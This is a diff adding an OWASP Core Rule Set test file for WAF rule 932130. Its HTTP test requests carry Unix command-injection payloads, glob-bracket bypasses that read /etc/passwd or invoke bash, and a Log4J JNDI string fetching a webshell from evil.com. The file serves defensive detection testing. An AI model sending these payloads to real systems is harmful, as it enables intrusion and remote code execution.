@@ -1,0 +1,265 @@
+---
+meta:
+  author: "Paul Beckett, Max Leske"
+  enabled: true
+  name: "932130.yaml"
+  description: "Tests to trigger or not trigger rule 932130"
+tests:
+  - test_title: 932130-1
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/?932130-1=$(cmd)"
+            protocol: "http"
+          output:
+            log_contains: 'id "932130"'
+  - test_title: 932130-2
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            data: "932130-2=${cmd}"
+            protocol: "http"
+          output:
+            log_contains: 'id "932130"'
+  - test_title: 932130-3
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: "931120-3=<(cmd)"
+            uri: "/"
+            protocol: "http"
+          output:
+            log_contains: 'id "932130"'
+  - test_title: 932130-4
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Cookie: ">(cmd)=931120-4"
+            uri: "/"
+            protocol: "http"
+          output:
+            log_contains: 'id "932130"'
+  - test_title: 932130-5
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            data: "932130-5=Some text (in brackets)."
+            protocol: "http"
+          output:
+            no_log_contains: 'id "932130"'
+  - test_title: 932130-6
+    desc: "Log4J exploit picked up by shell exploit detection in body"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Host: "localhost"
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: 'id "932130"'
+  - test_title: 932130-7
+    desc: "Unix command injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-8
+    desc: "Unix command injection - character set bypass technique"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            # cat /etc/pa[s]swd
+            uri: "/?cmd=cat%20/etc/pa%5Bs%5Dswd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-9
+    desc: "Unix command injection - character set bypass technique"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            # cat /[?]tc/pa[?]swd
+            uri: "/?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-10
+    desc: "Unix command injection - character set bypass - negative test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            # hello [text in brackets]
+            uri: "/?cmd=hello%20%5Btext%20in%20brackets%5D"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932130"
+  - test_title: 932130-11
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?s=/etc/pas[s]wd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-12
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?s=/etc/%5Bp%5Dasswd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-13
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?s=/etc/%5B!q%5Dasswd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-14
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?s=/etc/%5Bm-z%5Dasswd"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-15
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?s=/usr/bin/%5Bu%5Dname+-a"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
+  - test_title: 932130-16
+    desc: "Unix command injection - bracket bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/?exec=/bi%5Bn%5D/bash"
+            version: HTTP/1.0
+          output:
+            log_contains: id "932130"
